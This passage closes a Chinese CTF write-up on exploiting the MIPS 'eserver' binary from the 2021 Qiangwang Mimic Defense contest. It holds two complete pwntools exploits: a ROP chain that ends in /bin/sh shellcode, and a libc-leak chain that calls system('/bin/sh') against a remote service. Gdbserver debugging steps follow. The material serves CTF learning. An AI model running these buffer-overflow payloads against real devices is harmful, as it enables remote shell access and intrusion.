payload += padding           # $s2
payload += p32(loc_23828)    # $ra
#----------------------------------------
payload += b'd'*28
payload += shellcode
```

完整exp如下：

```python
from pwn import *
context.arch = "mips"
context.endian = 'little'
context.os = "linux"
context.log_level = 'debug'

libc = ELF("./lib/libc.so.6")

#-----------------------------------------------------------
p = remote("192.168.2.2",9999)
FullLibcCodeBase = 0x77E41000
loc_A0730 = FullLibcCodeBase + 0xA0730
loc_92838 = FullLibcCodeBase + 0x92838
loc_13A354 = FullLibcCodeBase + 0x13A354
loc_126440 = FullLibcCodeBase + 0x126440
loc_23828 = FullLibcCodeBase + 0x23828
sleep_TruE = FullLibcCodeBase + 0xB2BB0

padding = b"TruE"
shellcode = asm(shellcraft.sh())
payload = b'a'*504											# overflow
payload += b'b'*4										    # $fp								 
payload += p32(loc_A0730)    # $ra  
#----------------------------------------
payload += b'c'*36
payload += p32(sleep_TruE)   # $s0
payload += padding           # $s1
payload += padding           # $s2            
payload += p32(loc_92838)    # $s3
payload += p32(loc_13A354)   # ra  
#----------------------------------------
payload += b'd'*24
payload += padding           # $s0
payload += p32(loc_126440)   # $s1
payload += padding           # $s2
payload += p32(loc_23828)    # $ra
#----------------------------------------
payload += b'd'*28
payload += shellcode

p.sendlineafter('Input package: ', payload)
p.sendlineafter('Input package: ', 'EXIT')
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660894412215-2e568c75-e6e0-4bdb-9d08-db1c45af3d99.png)

既然都能直接调用sleep函数了，为什么不直接调用`system("/bin/sh")`呢？当然是可以的（自己需要修改一下下面的exp）：

```python
# exp来源自：https://mp.weixin.qq.com/s?__biz=Mzg4NzcxOTI0OQ==&mid=2247484858&idx=1&sn=12e41de29ab9a228dbace3151aef1fb5

#!/usr/bin/env python
#coding=utf-8
from pwn import*
context.log_level = "debug"
context.arch = "mips"
#context.endian = "small"
context.os = "linux"

main_arena = 0x1ebb80
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
local = 1
if local == 1:
    io=io=process(argv=['qemu-mipsel','-L','~/Desktop/mip/mipsel-linux-uclibc','./eserver'])
    #io=io=process(argv=['qemu-mipsel','-g','1234','-L','~/Desktop/mip/mipsel-linux-uclibc','./eserver'])
else:
    io=remote('node4.buuoj.cn',26469)

libc=ELF('./libc.so.6')
ru('Input package: ')
sl('Administrator')
ru('Input package: ')
sl('2')
ru('Response package: ')
l4 = 0x7f
l3 = u8(r(1))
l2 = ((libc.sym['read']&0xff00)>>8)-0x70
l1 = 0xa4
libc_base = (l1 ^ (l2<<8) ^ (l3<<16) ^ (l4<<24))-libc.sym['read']
su('libc_base',libc_base)
'''
.text:0011ACD8
.text:0011ACD8 var_38          = -0x38
.text:0011ACD8 var_30          = -0x30
.text:0011ACD8 var_28          = -0x28
.text:0011ACD8 var_24          = -0x24
.text:0011ACD8 var_20          = -0x20
.text:0011ACD8 var_1C          = -0x1C
.text:0011ACD8 var_18          = -0x18
.text:0011ACD8 var_14          = -0x14
.text:0011ACD8 var_10          = -0x10
.text:0011ACD8 var_C           = -0xC
.text:0011ACD8 var_8           = -8
.text:0011ACD8 var_4           = -4
.text:0011ACD8 var_s0          =  0
.text:0011ACD8 var_s4          =  4
.text:0011ACD8 var_s8          =  8
.text:0011ACD8 var_sC          =  0xC
.text:0011ACD8 var_s10         =  0x10
.text:0011ACD8 var_s14         =  0x14
.text:0011ACD8 var_s18         =  0x18
.text:0011ACD8 var_s1C         =  0x1C
.text:0011ACD8 var_s20         =  0x20
.text:0011ACD8 var_s24         =  0x24

.text:0011B170                 move    \$a0, \$fp
.text:0011B174
.text:0011B174 loc_11B174:                              # CODE XREF: sub_11ACD8:loc_11AD88↑j
.text:0011B174                                          # sub_11ACD8+B8↑j ...
.text:0011B174                 lw      \$ra, 0x48+var_s24(\$sp)
.text:0011B178                 lw      \$v0, 0x48+var_30(\$sp)
.text:0011B17C                 lw      \$fp, 0x48+var_s20(\$sp)
.text:0011B180                 lw      \$s7, 0x48+var_s1C(\$sp)
.text:0011B184                 lw      \$s6, 0x48+var_s18(\$sp)
.text:0011B188                 lw      \$s5, 0x48+var_s14(\$sp)
.text:0011B18C                 lw      \$s4, 0x48+var_s10(\$sp)
.text:0011B190                 lw      \$s3, 0x48+var_sC(\$sp)
.text:0011B194                 lw      \$s2, 0x48+var_s8(\$sp)
.text:0011B198                 lw      \$s1, 0x48+var_s4(\$sp)
.text:0011B19C                 lw      \$s0, 0x48+var_s0(\$sp)
.text:0011B1A0                 jr      \$ra
.text:0011B1A4                 addiu   \$sp, 0x70

.text:00134E80                 move    \$t9, \$fp
.text:00134E84                 jalr    \$t9
.text:00134E88                 move    \$at, \$at
'''
pay = b'a'*0x1f8+p32(libc.search('/bin/sh\0').next()+libc_base)+p32(0x0011B170+libc_base)+b'a'*0x68+p32(libc_base+libc.sym['system'])+p32(0x00134E80+libc_base)#
ru('Input package: ')
sl(pay)
ru('Input package: ')
sl('EXIT')
shell()
```

另外，还记得之前的qemu-user无法调试程序的情况吗？如果需要调试程序，需要在qemu-system中使用对应架构的gdbserver，这里我选择：

> + [https://github.com/lucyoa/embedded-tools/blob/master/gdbserver/gdbserver-7.12-mipsel-mips32rel2-v1](https://github.com/lucyoa/embedded-tools/blob/master/gdbserver/gdbserver-7.12-mipsel-mips32rel2-v1)
>

调试时在qemu-system中执行`./gdbserver-7.12-mipsel-mips32rel2-v1 0.0.0.0:1234 ./eserver `即可：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660895282094-12465f81-d9c1-4383-b019-52f178a9d990.png)

如果想要调试exp，则：

```python
from pwn import *
context.log_level = 'debug'

io = gdb.debug(['qemu-mipsel-static', '-L', './', './eserver'],gdbscript="file ./eserver\nls")	# 命令使用quit分隔
io.recvuntil('Input package: ')

io.interactive()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660896105346-cff3a256-a0f3-4316-8e6f-ce40d4239062.png)

# 参考资料
[https://www.anquanke.com/post/id/259594](https://www.anquanke.com/post/id/259594)

[https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/](https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/)

[http://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](http://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)

[https://blog.csdn.net/fjh1997/article/details/105910632](https://blog.csdn.net/fjh1997/article/details/105910632)

[《IoT从入门到入土》(1)--MIPS交叉编译环境搭建及其32位指令集](https://www.yuque.com/cyberangel/yal5fc/yxb067)



[2021第四届强网拟态防御积分赛工控pwn eserver WP - 安全客，安全资讯平台.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1660896776197-e90cefac-7bda-413a-a40f-a0b399bc1cfd.pdf)

[HWS赛题 入门 MIPS Pwn _ Clang裁缝店.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1660896775833-f78a19cd-19aa-4bd6-9ae9-524773e99aef.pdf)

[x86_64平台下的ubuntu调试Mips并连接pwntools与gdb_fjh1997的博客-CSDN博客.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1660896774808-6cab7e7b-0fc7-409e-a9ab-84f736cd6704.pdf)

